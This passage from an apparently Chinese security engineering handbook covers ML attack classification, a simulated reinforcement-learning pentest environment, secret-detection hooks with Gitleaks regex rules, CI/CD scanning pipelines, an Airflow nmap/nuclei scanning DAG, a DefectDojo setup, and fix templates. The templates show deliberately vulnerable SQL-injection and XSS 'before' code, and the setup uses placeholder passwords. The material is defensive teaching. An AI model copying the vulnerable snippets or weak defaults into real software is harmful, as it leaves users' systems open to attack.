        prediction = self.isolation_forest.predict(features_scaled)[0]
        anomaly_score = self.isolation_forest.score_samples(features_scaled)[0]
        
        is_anomaly = prediction == -1
        return is_anomaly, anomaly_score
    
    def save(self, path: str):
        joblib.dump({
            'isolation_forest': self.isolation_forest,
            'scaler': self.scaler,
            'vectorizer': self.vectorizer
        }, path)
    
    def load(self, path: str):
        data = joblib.load(path)
        self.isolation_forest = data['isolation_forest']
        self.scaler = data['scaler']
        self.vectorizer = data['vectorizer']
        self.is_trained = True

class AttackClassifier:
    """攻击类型分类器"""
    
    def __init__(self):
        self.model = RandomForestClassifier(
            n_estimators=100,
            random_state=42
        )
        self.label_encoder = LabelEncoder()
        self.attack_types = [
            'normal', 'sql_injection', 'xss', 'command_injection',
            'path_traversal', 'ssrf', 'xxe', 'csrf', 'file_upload',
            'brute_force', 'credential_stuffing', 'api_abuse'
        ]
    
    def train(self, labeled_data: pd.DataFrame):
        """训练分类器"""
        # labeled_data should have columns: features + 'attack_type'
        X = labeled_data.drop('attack_type', axis=1)
        y = self.label_encoder.fit_transform(labeled_data['attack_type'])
        self.model.fit(X, y)
    
    def classify(self, features: np.ndarray) -> str:
        """分类攻击类型"""
        prediction = self.model.predict(features.reshape(1, -1))[0]
        return self.label_encoder.inverse_transform([prediction])[0]
```

### 8.4 强化学习渗透路径规划

强化学习可以用于自动化渗透测试的路径规划，学习最优的攻击序列以达到目标。

```python
#!/usr/bin/env python3
"""强化学习驱动的渗透路径规划"""

import numpy as np
import gymnasium as gym
from gymnasium import spaces
from typing import Dict, List, Tuple, Optional

class PenetrationTestingEnv(gym.Env):
    """渗透测试环境 — 强化学习训练环境"""
    
    def __init__(self, target_network: Dict):
        super().__init__()
        self.target_network = target_network
        self.current_state = self._get_initial_state()
        
        # 动作空间：扫描、漏洞利用、横向移动、提权、数据窃取
        self.action_space = spaces.Discrete(5)
        
        # 状态空间：当前主机权限、发现的漏洞、网络拓扑
        self.observation_space = spaces.Box(
            low=0, high=1, shape=(100,), dtype=np.float32
        )
        
        self.max_steps = 50
        self.current_step = 0
    
    def _get_initial_state(self) -> np.ndarray:
        """获取初始状态"""
        # 编码网络拓扑、已知漏洞、当前权限等
        return np.zeros(100, dtype=np.float32)
    
    def step(self, action: int) -> Tuple[np.ndarray, float, bool, bool, Dict]:
        """执行动作"""
        self.current_step += 1
        
        reward = 0.0
        terminated = False
        truncated = self.current_step >= self.max_steps
        
        # 动作映射
        if action == 0:  # 扫描
            reward = self._perform_scan()
        elif action == 1:  # 漏洞利用
            reward = self._exploit_vulnerability()
        elif action == 2:  # 横向移动
            reward = self._lateral_movement()
        elif action == 3:  # 提权
            reward = self._privilege_escalation()
        elif action == 4:  # 数据窃取
            reward = self._data_exfiltration()
        
        # 检查是否达到目标
        if self._goal_reached():
            reward += 100.0
            terminated = True
        
        return self.current_state, reward, terminated, truncated, {}
    
    def _perform_scan(self) -> float:
        """扫描动作 — 发现新主机和服务"""
        # 随机发现新信息
        if np.random.random() < 0.3:
            return 5.0  # 发现新主机
        return 0.5  # 信息收集
    
    def _exploit_vulnerability(self) -> float:
        """漏洞利用 — 尝试利用已知漏洞"""
        if np.random.random() < 0.2:
            return 20.0  # 成功利用
        return -1.0  # 失败（可能触发告警）
    
    def _lateral_movement(self) -> float:
        """横向移动"""
        if np.random.random() < 0.15:
            return 30.0
        return -2.0
    
    def _privilege_escalation(self) -> float:
        """提权"""
        if np.random.random() < 0.1:
            return 50.0
        return -3.0
    
    def _data_exfiltration(self) -> float:
        """数据窃取"""
        if np.random.random() < 0.05:
            return 100.0
        return -5.0
    
    def _goal_reached(self) -> bool:
        """检查是否达到渗透目标"""
        return False  # 简化实现
    
    def reset(self, seed=None, options=None) -> Tuple[np.ndarray, Dict]:
        self.current_step = 0
        self.current_state = self._get_initial_state()
        return self.current_state, {}

# 使用DQN训练渗透测试智能体
# from stable_baselines3 import DQN
# env = PenetrationTestingEnv(target_network)
# model = DQN('MlpPolicy', env, verbose=1)
# model.learn(total_timesteps=100000)
# model.save("pentest_dqn_agent")
```

---

## §9 持续安全 (Continuous Security)

### 9.1 概述

持续安全（Continuous Security）是DevSecOps的核心实践，强调将安全测试无缝集成到CI/CD流水线中，实现"安全左移"（Shift Left）和"安全右移"（Shift Right）的全面覆盖。2026年的持续安全实践包括：Pre-commit安全钩子、CI/CD流水线中的SAST/DAST/SCA扫描、安全门禁（Quality Gate/Security Gate）、自动SBOM生成与签名验证、以及运行时安全反馈闭环。

核心原则：安全测试自动化、安全结果可操作化、安全反馈实时化。安全不应成为开发速度的瓶颈，而应成为质量的保障。

### 9.2 Pre-commit安全钩子

Pre-commit钩子是在代码提交前进行安全检查的第一道防线，可以防止密钥泄露、敏感信息提交、以及明显的安全漏洞进入代码库。

```bash
# 安装pre-commit框架
pip install pre-commit

# .pre-commit-config.yaml
cat > .pre-commit-config.yaml << 'EOF'
repos:
  # 密钥检测
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v5.0.0
    hooks:
      - id: detect-private-key
      - id: detect-aws-credentials
        args: ['--allow-missing-credentials']
      - id: check-added-large-files
        args: ['--maxkb=500']
      - id: check-merge-conflict
      - id: check-yaml
      - id: check-json
  
  # Gitleaks: 密钥和敏感信息泄漏检测
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.20.0
    hooks:
      - id: gitleaks
  
  # Semgrep SAST
  - repo: https://github.com/returntocorp/semgrep
    rev: v1.70.0
    hooks:
      - id: semgrep
        args:
          - '--config'
          - 'auto'
          - '--error'
          - '--skip-unknown-extensions'
        files: \.(py|java|js|ts|go|rb|php)$
  
  # TruffleHog: 深度密钥检测
  - repo: https://github.com/trufflesecurity/trufflehog
    rev: v3.75.0
    hooks:
      - id: trufflehog
        args: ['--json', '--only-verified']
  
  # 依赖检查
  - repo: local
    hooks:
      - id: npm-audit
        name: npm audit
        entry: npm audit --audit-level=high
        language: system
        files: ^package\.json$
        pass_filenames: false
      
      - id: pip-audit
        name: pip audit
        entry: pip-audit
        language: system
        files: ^requirements\.txt$
        pass_filenames: false
EOF

# 安装pre-commit钩子
pre-commit install
pre-commit install --hook-type pre-push
pre-commit install --hook-type commit-msg

# 运行所有钩子（手动触发）
pre-commit run --all-files
```

**自定义Gitleaks配置 (.gitleaks.toml)**:

```toml
title = "Gitleaks Security Configuration"

[allowlist]
  description = "全局白名单"
  paths = [
    '''node_modules''',
    '''vendor''',
    '''\.git''',
    '''test/''',
    '''tests/''',
    '''\.lock$'''
  ]

[[rules]]
  id = "aws-access-key"
  description = "AWS Access Key"
  regex = '''(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'''
  tags = ["key", "aws"]

[[rules]]
  id = "github-pat"
  description = "GitHub Personal Access Token"
  regex = '''ghp_[0-9a-zA-Z]{36}'''
  tags = ["key", "github"]

[[rules]]
  id = "jwt-token"
  description = "JWT Token"
  regex = '''eyJ[a-zA-Z0-9-_]+\.eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+'''
  tags = ["token", "jwt"]

[[rules]]
  id = "private-key"
  description = "Private Key"
  regex = '''-----BEGIN (RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----'''
  tags = ["key", "private-key"]

[[rules]]
  id = "slack-token"
  description = "Slack Token"
  regex = '''xox[baprs]-([0-9a-zA-Z]{10,48})?'''
  tags = ["token", "slack"]

[[rules]]
  id = "database-connection-string"
  description = "Database Connection String"
  regex = '''(?i)(jdbc|mongodb|mysql|postgresql|redis|sqlserver)://[^/\s]+(/[^\s]+)?'''
  tags = ["connection", "database"]
```

### 9.3 GitHub Actions安全流水线

```yaml
# .github/workflows/security-pipeline.yml
name: Security Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # 每周一早上6点全量扫描

env:
  SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
  NVD_API_KEY: ${{ secrets.NVD_API_KEY }}

jobs:
  # Stage 1: SAST (静态分析)
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Semgrep SAST
        run: |
          pip install semgrep
          semgrep --config auto --sarif --output semgrep.sarif .
      
      - name: Run CodeQL Analysis
        uses: github/codeql-action/init@v3
        with:
          languages: javascript,python,java
      
      - name: CodeQL Build
        run: |
          npm ci
          npm run build
      
      - name: Run CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          category: "/language:javascript"
      
      - name: Upload SAST Results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep.sarif

  # Stage 2: SCA (依赖扫描)
  sca:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --all-projects --severity-threshold=high
      
      - name: Run Trivy FS Scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: fs
          scan-ref: .
          format: sarif
          output: trivy-fs.sarif
          severity: CRITICAL,HIGH
      
      - name: Generate SBOM
        run: |
          syft . -o cyclonedx-json > sbom.json
      
      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.json

  # Stage 3: 容器扫描
  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Build Docker Image
        run: docker build -t myapp:${{ github.sha }} .
      
      - name: Run Trivy Container Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          format: sarif
          output: trivy-container.sarif
          severity: CRITICAL,HIGH
          exit-code: 1
      
      - name: Run Docker Scout
        run: |
          docker scout cves myapp:${{ github.sha }} \
            --format sarif --output docker-scout.sarif \
            --only-severity critical,high
      
      - name: Upload Container Results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-container.sarif

  # Stage 4: DAST (动态扫描)
  dast:
    runs-on: ubuntu-latest
    needs: [container-scan]
    steps:
      - name: Deploy to Staging
        run: |
          docker run -d -p 8080:8080 myapp:${{ github.sha }}
          sleep 30
      
      - name: Run ZAP Full Scan
        uses: zaproxy/action-full-scan@v0.12.0
        with:
          target: http://localhost:8080
          rules_file_name: .zap/rules.tsv
          cmd_options: '-a -j -T 60'
      
      - name: Run Nuclei Scan
        run: |
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          nuclei -u http://localhost:8080 \
            -t ~/nuclei-templates/ \
            -severity critical,high \
            -jsonl -o nuclei.jsonl
      
      - name: Check DAST Results
        run: |
          CRITICAL=$(cat nuclei.jsonl 2>/dev/null | jq -r 'select(.info.severity=="critical")' | wc -l)
          if [ "$CRITICAL" -gt 0 ]; then
            echo "CRITICAL: $CRITICAL issues found in DAST!"
            exit 1
          fi
          echo "DAST scan passed with no critical findings."

  # Stage 5: IaC扫描
  iac-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Checkov
        uses: bridgecrewio/checkov-action@master
        with:
          directory: .
          framework: terraform,cloudformation,helm,kubernetes
          output_format: sarif
          output_file_path: checkov.sarif
          soft_fail: false
      
      - name: Run tfsec
        if: hashFiles('**/*.tf') != ''
        uses: aquasecurity/tfsec-action@v1.0.3
        with:
          working_directory: .
          output_format: sarif
          output_file: tfsec.sarif
      
      - name: Upload IaC Results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: checkov.sarif
```

### 9.4 GitLab CI/CD 安全扫描

```yaml
# .gitlab-ci.yml
stages:
  - sast
  - sca
  - container-scan
  - dast
  - compliance

variables:
  SAST_EXCLUDED_PATHS: "spec, test, tests, tmp, vendor"
  SECURE_LOG_LEVEL: "info"

include:
  # GitLab SAST模板
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Secret-Detection.gitlab-ci.yml
  - template: Security/Dependency-Scanning.gitlab-ci.yml
  - template: Security/Container-Scanning.gitlab-ci.yml
  - template: Security/DAST.gitlab-ci.yml

# 自定义SAST配置
semgrep-sast:
  stage: sast
  image: returntocorp/semgrep:latest
  script:
    - semgrep --config auto --sarif --output semgrep.sarif .
  artifacts:
    reports:
      sast: semgrep.sarif
    paths:
      - semgrep.sarif

# 自定义容器扫描
trivy-container-scan:
  stage: container-scan
  image:
    name: aquasec/trivy:latest
    entrypoint: [""]
  script:
    - trivy image --severity CRITICAL,HIGH
      --format json --output trivy.json
      $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
    - trivy image --severity CRITICAL,HIGH
      --exit-code 1
      $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  artifacts:
    paths:
      - trivy.json

# DAST扫描
dast:
  stage: dast
  image:
    name: ghcr.io/zaproxy/zaproxy:stable
    entrypoint: [""]
  variables:
    DAST_WEBSITE: https://staging.example.com
    DAST_FULL_SCAN_ENABLED: "true"
    DAST_BROWSER_SCAN: "true"
    DAST_API_HOST_OVERRIDE: "staging.example.com"
  script:
    - zap-api-scan.py -t $DAST_WEBSITE -f openapi
      -r zap_report.html
      -z "-config api.addrs.addr.name=.* -config api.addrs.addr.regex=true"
  artifacts:
    paths:
      - zap_report.html
    expire_in: 1 week

# 安全门禁
security-gate:
  stage: compliance
  image: python:3.12
  script:
    - pip install requests
    - python3 security_gate.py
  allow_failure: false
```

**安全门禁脚本 (security_gate.py)**:

```python
#!/usr/bin/env python3
"""安全门禁检查脚本 — 集成到CI/CD流水线"""

import json, sys, os
from datetime import datetime, timedelta

class SecurityGate:
    def __init__(self):
        self.gate_rules = {
            'critical_vulnerabilities': 0,      # Critical漏洞数量上限
            'high_vulnerabilities': 5,          # High漏洞数量上限
            'medium_vulnerabilities': 20,       # Medium漏洞数量上限
            'max_cvss_score': 9.0,              # 允许的最高CVSS评分
            'sast_blocker': True,               # SAST阻断
            'sca_blocker': True,                # SCA阻断
            'container_blocker': True,          # 容器扫描阻断
            'secret_blocker': True,             # 密钥泄露阻断
            'dast_blocker': True,               # DAST阻断
            'sbom_required': True,              # SBOM必须存在
            'signed_commits_required': True,    # 签名提交必须
        }
        self.results = {
            'passed': True,
            'checks': [],
            'timestamp': datetime.now().isoformat()
        }
    
    def check_semgrep(self, sarif_path: str = 'semgrep.sarif'):
        """检查Semgrep SAST结果"""
        if not os.path.exists(sarif_path):
            if self.gate_rules['sast_blocker']:
                self.results['passed'] = False
            self.results['checks'].append({
                'name': 'SAST (Semgrep)',
                'status': 'SKIPPED',
                'reason': 'No SARIF file found'
            })
            return
        
        with open(sarif_path) as f:
            sarif = json.load(f)
        
        critical = 0
        high = 0
        for run in sarif.get('runs', []):
            for result in run.get('results', []):
                severity = result.get('properties', {}).get('github/security-severity', 0)
                if severity >= 9.0:
                    critical += 1
                elif severity >= 7.0:
                    high += 1
        
        status = 'PASSED'
        if critical > self.gate_rules['critical_vulnerabilities']:
            status = 'FAILED'
            if self.gate_rules['sast_blocker']:
                self.results['passed'] = False
        elif high > self.gate_rules['high_vulnerabilities']:
            status = 'WARNING'
        
        self.results['checks'].append({
            'name': 'SAST (Semgrep)',
            'status': status,
            'critical': critical,
            'high': high,
            'threshold': {'critical': self.gate_rules['critical_vulnerabilities'],
                         'high': self.gate_rules['high_vulnerabilities']}
        })
    
    def check_trivy(self, json_path: str = 'trivy.json'):
        """检查Trivy容器扫描结果"""
        if not os.path.exists(json_path):
            if self.gate_rules['container_blocker']:
                self.results['passed'] = False
            self.results['checks'].append({
                'name': 'Container Scan (Trivy)',
                'status': 'SKIPPED',
                'reason': 'No results file found'
            })
            return
        
        with open(json_path) as f:
            trivy = json.load(f)
        
        critical = 0
        high = 0
        for result in trivy.get('Results', []):
            for vuln in result.get('Vulnerabilities', []):
                sev = vuln.get('Severity', '').upper()
                if sev == 'CRITICAL':
                    critical += 1
                elif sev == 'HIGH':
                    high += 1
        
        status = 'PASSED'
        if critical > self.gate_rules['critical_vulnerabilities']:
            status = 'FAILED'
            if self.gate_rules['container_blocker']:
                self.results['passed'] = False
        elif high > self.gate_rules['high_vulnerabilities']:
            status = 'WARNING'
        
        self.results['checks'].append({
            'name': 'Container Scan (Trivy)',
            'status': status,
            'critical': critical,
            'high': high
        })
    
    def check_secrets(self, json_path: str = 'secret_detection.json'):
        """检查密钥泄露"""
        if not os.path.exists(json_path):
            return
        
        with open(json_path) as f:
            secrets = json.load(f)
        
        if secrets.get('vulnerabilities', []):
            if self.gate_rules['secret_blocker']:
                self.results['passed'] = False
            self.results['checks'].append({
                'name': 'Secret Detection',
                'status': 'FAILED',
                'count': len(secrets.get('vulnerabilities', [])),
                'reason': 'Secrets found in codebase'
            })
    
    def check_sbom(self, sbom_path: str = 'sbom.json'):
        """检查SBOM是否存在"""
        exists = os.path.exists(sbom_path)
        if self.gate_rules['sbom_required'] and not exists:
            self.results['passed'] = False
        self.results['checks'].append({
            'name': 'SBOM',
            'status': 'PASSED' if exists else 'FAILED',
            'reason': 'SBOM required' if not exists else None
        })
    
    def run_all(self):
        """运行所有门禁检查"""
        self.check_semgrep()
        self.check_trivy()
        self.check_secrets()
        self.check_sbom()
        
        print("=" * 60)
        print("SECURITY GATE RESULTS")
        print("=" * 60)
        for check in self.results['checks']:
            icon = "PASS" if check['status'] == 'PASSED' else \
                   "WARN" if check['status'] == 'WARNING' else "FAIL"
            print(f"[{icon}] {check['name']}: {check['status']}")
            if 'critical' in check:
                print(f"      Critical: {check['critical']}, High: {check['high']}")
            if 'reason' in check and check['reason']:
                print(f"      Reason: {check['reason']}")
        
        print("=" * 60)
        if self.results['passed']:
            print("SECURITY GATE: PASSED - All checks passed")
        else:
            print("SECURITY GATE: FAILED - Blocking deployment")
        print("=" * 60)
        
        return self.results['passed']

if __name__ == '__main__':
    gate = SecurityGate()
    passed = gate.run_all()
    sys.exit(0 if passed else 1)
```

### 9.5 持续安全最佳实践清单

1. **分层安全扫描**: 在开发（IDE/pre-commit）、构建（CI）、部署（CD）、运行（Runtime）各阶段部署安全扫描。
2. **安全门禁自动化**: 配置明确的安全门禁规则，Critical漏洞必须阻断流水线。
3. **SBOM生成与签名**: 每次构建自动生成SBOM（CycloneDX/SPDX格式），并使用Cosign进行签名验证。
4. **增量扫描**: 在PR中仅扫描变更文件，减少扫描时间，保持快速反馈。
5. **安全结果集中管理**: 将SAST/SCA/DAST/容器扫描结果统一导入到安全仪表板（如DefectDojo、GitHub Security）。
6. **误报管理**: 建立误报标记和豁免流程，定期审查和清理误报规则。
7. **自动修复**: 对于低风险问题（如格式化、依赖升级），启用自动修复PR。
8. **定期全量扫描**: 在PR增量扫描的基础上，定期（每周）运行全量深度扫描。

---

## §10 扫描自动化与编排 (Scan Automation & Orchestration)

### 10.1 概述

扫描自动化与编排是安全运营规模化（Security at Scale）的关键。2026年的安全扫描编排需要处理：多工具扫描结果聚合、扫描任务调度与分布式执行、扫描结果关联分析、漏洞生命周期管理、自动修复建议生成、以及合规报告自动生成。

核心技术栈：DefectDojo 3.0+、ThreadFix 3.2+、Archery 2.0+、Apache Airflow + 自定义安全DAG、以及自研的扫描编排引擎。

### 10.2 扫描调度引擎

基于Apache Airflow的安全扫描编排，实现定时扫描、事件驱动扫描、以及分布式扫描。

```python
# airflow/dags/security_scanning_dag.py
"""安全扫描编排DAG — 基于Apache Airflow"""

from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator
from airflow.operators.bash import BashOperator
from airflow.operators.trigger_dagrun import TriggerDagRunOperator
from airflow.utils.task_group import TaskGroup
import json, subprocess, os

default_args = {
    'owner': 'security-team',
    'depends_on_past': False,
    'start_date': datetime(2026, 7, 1),
    'email': ['security-alerts@example.com'],
    'email_on_failure': True,
    'email_on_retry': False,
    'retries': 2,
    'retry_delay': timedelta(minutes=5),
    'execution_timeout': timedelta(hours=4)
}

dag = DAG(
    'security_scanning_pipeline',
    default_args=default_args,
    description='Complete security scanning pipeline',
    schedule_interval='0 2 * * 0',  # 每周日凌晨2点
    catchup=False,
    max_active_runs=1,
    tags=['security', 'scanning', 'automation']
)

def asset_discovery(**context):
    """资产发现任务"""
    assets = []
    
    # AWS EC2实例发现
    try:
        import boto3
        ec2 = boto3.client('ec2')
        instances = ec2.describe_instances(
            Filters=[{'Name': 'instance-state-name', 'Values': ['running']}]
        )
        for r in instances['Reservations']:
            for i in r['Instances']:
                assets.append({
                    'type': 'aws_ec2',
                    'ip': i['PrivateIpAddress'],
                    'public_ip': i.get('PublicIpAddress'),
                    'instance_id': i['InstanceId'],
                    'tags': {t['Key']: t['Value'] for t in i.get('Tags', [])}
                })
    except:
        pass
    
    # Kubernetes Pod发现
    try:
        result = subprocess.run(
            ['kubectl', 'get', 'pods', '-A', '-o', 'json'],
            capture_output=True, text=True
        )
        pods = json.loads(result.stdout)
        for pod in pods.get('items', []):
            if pod['status'].get('podIP'):
                assets.append({
                    'type': 'k8s_pod',
                    'ip': pod['status']['podIP'],
                    'namespace': pod['metadata']['namespace'],
                    'name': pod['metadata']['name']
                })
    except:
        pass
    
    # 从CMDB/资产管理系统获取
    # ...
    
    ti = context['task_instance']
    ti.xcom_push(key='assets', value=assets)
    print(f"Discovered {len(assets)} assets")

def distribute_scan_targets(**context):
    """分布式扫描目标分配"""
    ti = context['task_instance']
    assets = ti.xcom_pull(task_ids='asset_discovery', key='assets')
    
    # 按网段分组
    groups = {}
    for asset in assets:
        ip = asset.get('ip', '')
        if ip:
            # 按/24子网分组
            subnet = '.'.join(ip.split('.')[:3])
            groups.setdefault(subnet, []).append(asset)
    
    # 分配给不同的扫描节点
    scan_nodes = ['scanner-01', 'scanner-02', 'scanner-03']
    assignments = {}
    for i, (subnet, assets) in enumerate(groups.items()):
        node = scan_nodes[i % len(scan_nodes)]
        if node not in assignments:
            assignments[node] = []
        assignments[node].extend(assets)
    
    for node, node_assets in assignments.items():
        ti.xcom_push(key=f'assets_{node}', value=node_assets)

def run_nmap_scan(**context):
    """运行Nmap扫描"""
    ti = context['task_instance']
    assets = ti.xcom_pull(task_ids='distribute_scan_targets', key='assets_scanner-01')
    
    targets = [a['ip'] for a in assets if a.get('ip')]
    with open('/tmp/nmap_targets.txt', 'w') as f:
        f.write('\n'.join(targets))
    
    cmd = f"nmap -sS -sV -sC -p- --min-rate 1000 -iL /tmp/nmap_targets.txt -oA /tmp/nmap_scan"
    subprocess.run(cmd, shell=True)
    
    ti.xcom_push(key='nmap_complete', value=True)

def run_nuclei_scan(**context):
    """运行Nuclei扫描"""
    # 从Nmap结果中提取Web服务
    web_targets = []
    # ... 解析nmap结果
    
    with open('/tmp/nuclei_targets.txt', 'w') as f:
        f.write('\n'.join(web_targets[:100]))
    
    cmd = (
        f"nuclei -l /tmp/nuclei_targets.txt "
        f"-t /opt/nuclei-templates/ "
        f"-severity critical,high,medium "
        f"-rate-limit 100 -concurrency 50 "
        f"-jsonl -o /tmp/nuclei_results.jsonl"
    )
    subprocess.run(cmd, shell=True)

def run_vulnerability_scan(**context):
    """运行漏洞扫描（Nessus/OpenVAS）"""
    # 调用Nessus API启动扫描
    # 等待扫描完成
    # 下载结果
    pass

def aggregate_results(**context):
    """结果聚合与关联分析"""
    ti = context['task_instance']
    
    all_findings = []
    
    # 聚合Nuclei结果
    try:
        with open('/tmp/nuclei_results.jsonl') as f:
            for line in f:
                finding = json.loads(line)
                all_findings.append({
                    'source': 'nuclei',
                    'host': finding.get('host'),
                    'name': finding.get('info', {}).get('name'),
                    'severity': finding.get('info', {}).get('severity'),
                    'cve': finding.get('info', {}).get('classification', {}).get('cve-id'),
                    'template': finding.get('template-id'),
                    'timestamp': finding.get('timestamp')
                })
    except:
        pass
    
    # 关联分析：相同主机的不同工具发现
    host_findings = {}
    for f in all_findings:
        host = f.get('host')
        if host not in host_findings:
            host_findings[host] = []
        host_findings[host].append(f)
    
    # 去重与优先级排序
    # ...
    
    with open('/tmp/aggregated_results.json', 'w') as f:
        json.dump(all_findings, f, indent=2)

def generate_report(**context):
    """生成安全报告"""
    with open('/tmp/aggregated_results.json') as f:
        findings = json.load(f)
    
    # 按严重性统计
    severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
    for f in findings:
        sev = f.get('severity', 'info').lower()
        if sev in severity_counts:
            severity_counts[sev] += 1
    
    # 生成HTML报告
    html_report = f"""
    <h1>Security Scan Report</h1>
    <p>Generated: {datetime.now().isoformat()}</p>
    <h2>Summary</h2>
    <ul>
        <li>Critical: {severity_counts['critical']}</li>
        <li>High: {severity_counts['high']}</li>
        <li>Medium: {severity_counts['medium']}</li>
        <li>Low: {severity_counts['low']}</li>
    </ul>
    """
    
    with open('/tmp/security_report.html', 'w') as f:
        f.write(html_report)
    
    print(f"Report generated: {severity_counts}")

def notify_results(**context):
    """通知扫描结果"""
    ti = context['task_instance']
    # 发送Slack/飞书/邮件通知
    # 如果发现Critical漏洞，发送紧急通知
    pass

# 定义任务依赖关系
with dag:
    with TaskGroup("discovery", tooltip="Asset Discovery Phase") as discovery:
        t_discover = PythonOperator(
            task_id='asset_discovery',
            python_callable=asset_discovery
        )
        t_distribute = PythonOperator(
            task_id='distribute_scan_targets',
            python_callable=distribute_scan_targets
        )
        t_discover >> t_distribute
    
    with TaskGroup("network_scanning", tooltip="Network Scanning Phase") as network:
        t_nmap = PythonOperator(
            task_id='nmap_scan',
            python_callable=run_nmap_scan
        )
    
    with TaskGroup("vulnerability_scanning", tooltip="Vulnerability Scanning Phase") as vuln:
        t_nuclei = PythonOperator(
            task_id='nuclei_scan',
            python_callable=run_nuclei_scan
        )
        t_nessus = PythonOperator(
            task_id='nessus_scan',
            python_callable=run_vulnerability_scan
        )
    
    with TaskGroup("reporting", tooltip="Reporting Phase") as report:
        t_aggregate = PythonOperator(
            task_id='aggregate_results',
            python_callable=aggregate_results
        )
        t_report = PythonOperator(
            task_id='generate_report',
            python_callable=generate_report
        )
        t_notify = PythonOperator(
            task_id='notify_results',
            python_callable=notify_results
        )
        t_aggregate >> t_report >> t_notify
    
    # 编排依赖
    discovery >> network >> vuln >> report
```

### 10.3 漏洞管理平台集成 (DefectDojo)

DefectDojo是开源漏洞管理平台，2026年3.0版本支持了AI辅助的漏洞优先级排序、自动修复建议生成、以及多租户隔离。

```bash
# Docker Compose部署DefectDojo
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  nginx:
    image: defectdojo/defectdojo-nginx:3.0.0
    ports:
      - "8080:8080"
    depends_on:
      - uwsgi
  
  uwsgi:
    image: defectdojo/defectdojo-django:3.0.0
    environment:
      - DD_DATABASE_URL=postgresql://defectdojo:defectdojo@postgres:5432/defectdojo
      - DD_CELERY_BROKER_URL=redis://redis:6379/0
      - DD_SECRET_KEY=change-me-in-production
      - DD_DEBUG=False
      - DD_ALLOWED_HOSTS=*
      - DD_SITE_URL=http://localhost:8080
    depends_on:
      - postgres
      - redis
  
  celerybeat:
    image: defectdojo/defectdojo-django:3.0.0
    command: celery -A dojo beat -l info
    environment:
      - DD_DATABASE_URL=postgresql://defectdojo:defectdojo@postgres:5432/defectdojo
      - DD_CELERY_BROKER_URL=redis://redis:6379/0
    depends_on:
      - postgres
      - redis
  
  celeryworker:
    image: defectdojo/defectdojo-django:3.0.0
    command: celery -A dojo worker -l info
    environment:
      - DD_DATABASE_URL=postgresql://defectdojo:defectdojo@postgres:5432/defectdojo
      - DD_CELERY_BROKER_URL=redis://redis:6379/0
    depends_on:
      - postgres
      - redis
  
  postgres:
    image: postgres:16
    environment:
      - POSTGRES_USER=defectdojo
      - POSTGRES_PASSWORD=defectdojo
      - POSTGRES_DB=defectdojo
    volumes:
      - postgres_data:/var/lib/postgresql/data
  
  redis:
    image: redis:7-alpine

volumes:
  postgres_data:
EOF

# 通过API导入扫描结果
curl -X POST http://localhost:8080/api/v2/import-scan/ \
  -H "Authorization: Token $DEFECTDOJO_TOKEN" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@nuclei_results.jsonl" \
  -F "scan_type=Nuclei Scan" \
  -F "engagement=1" \
  -F "auto_create_context=true" \
  -F "close_old_findings=true" \
  -F "verified=true"

# 批量导入多工具结果
for tool in nmap nessus nuclei zap trivy; do
  for file in results/${tool}_*.json; do
    curl -X POST http://localhost:8080/api/v2/import-scan/ \
      -H "Authorization: Token $DEFECTDOJO_TOKEN" \
      -F "file=@$file" \
      -F "scan_type=$(get_scan_type $tool)" \
      -F "engagement=1" \
      -F "auto_create_context=true"
  done
done
```

### 10.4 自动修复建议生成

```python
#!/usr/bin/env python3
"""自动修复建议生成引擎"""

import json, re
from typing import Dict, List, Optional

class AutoRemediationEngine:
    """自动修复建议引擎"""
    
    REMEDIATION_TEMPLATES = {
        'CWE-79': {  # XSS
            'title': '跨站脚本攻击(XSS)修复',
            'solutions': [
                {
                    'language': 'javascript',
                    'description': '使用textContent代替innerHTML',
                    'before': 'element.innerHTML = userInput;',
                    'after': 'element.textContent = userInput;'
                },
                {
                    'language': 'java',
                    'description': '使用ESAPI编码器',
                    'before': '<%= request.getParameter("name") %>',
                    'after': '<%= ESAPI.encoder().encodeForHTML(request.getParameter("name")) %>'
                },
                {
                    'language': 'python',
                    'description': '使用Jinja2自动转义',
                    'before': 'render_template_string("Hello {{ name }}", name=user_input)',
                    'after': 'render_template("hello.html", name=user_input)  # 使用autoescape'
                }
            ]
        },
        'CWE-89': {  # SQL Injection
            'title': 'SQL注入修复',
            'solutions': [
                {
                    'language': 'java',
                    'description': '使用PreparedStatement',
                    'before': 'Statement stmt = conn.createStatement();\nstmt.executeQuery("SELECT * FROM users WHERE id = " + userId);',
                    'after': 'PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");\nstmt.setString(1, userId);\nstmt.executeQuery();'
                },
                {
